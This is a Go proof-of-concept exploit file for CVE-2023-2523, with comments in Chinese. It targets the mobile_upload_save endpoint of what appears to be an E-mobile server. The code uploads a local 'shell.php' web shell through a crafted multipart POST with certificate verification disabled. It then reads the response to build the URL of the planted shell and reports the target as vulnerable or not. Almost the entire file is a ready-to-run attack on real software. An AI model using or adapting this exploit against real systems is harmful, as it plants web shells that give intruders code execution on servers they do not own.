package poc

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"mime/multipart"
	"net/http"
	"os"
	"regexp"
)

func CVE_2023_2523(targetURL string) string {
	// 设置发送的文件路径
	filePath := "shell.php"

	// 调用 NewRequest 方法创建请求对象
	buf := &bytes.Buffer{}
	writer := multipart.NewWriter(buf)

	// 添加文件
	fileWriter, err := writer.CreateFormFile("upload_quwan", filePath)
	if err != nil {
		panic(err)
	}

	// 打开文件并将其复制到表单的字节缓冲区中
	file, err := os.Open(filePath)
	if err != nil {
		panic(err)
	}
	defer file.Close()
	_, err = io.Copy(fileWriter, file)
	if err != nil {
		panic(err)
	}

	// 添加空文件
	writer.CreateFormFile("file", "")

	// 完成表单数据填充
	err = writer.Close()
	if err != nil {
		panic(err)
	}

	// 创建发送 POST 请求
	req, err := http.NewRequest("POST", targetURL+"/E-mobile/App/Ajax/ajax.php?action=mobile_upload_save", buf)
	if err != nil {
		panic(err)
	}
	req.Header.Set("Content-Type", writer.FormDataContentType())

	// 解决https证书问题
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}

	resp, err := client.Do(req)
	if err != nil {
		log.Print(err)
		return "err"
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Print(err)
		return "err"
	}
	//判断漏洞是否存在
	reg := regexp.MustCompile("attachment")
	tag := reg.MatchString(string(body))
	if resp.StatusCode == 200 && tag {
		result := string(body)
		var arr []interface{}
		if err := json.Unmarshal([]byte(result), &arr); err != nil {
			panic(err)
		}
		id, _ := arr[2].(float64)
		filename, _ := arr[3].(string)
		shellUrl := targetURL + "/attachment/" + fmt.Sprintf("%.0f", id) + "/" + filename
		log.Println("[+] 存在CVE-2023-2523漏洞：", shellUrl)
		return shellUrl
	} else {
		log.Println("[-] 不存在CVE-2023-2523漏洞")
		return "[-] 不存在CVE-2023-2523漏洞"
	}

}
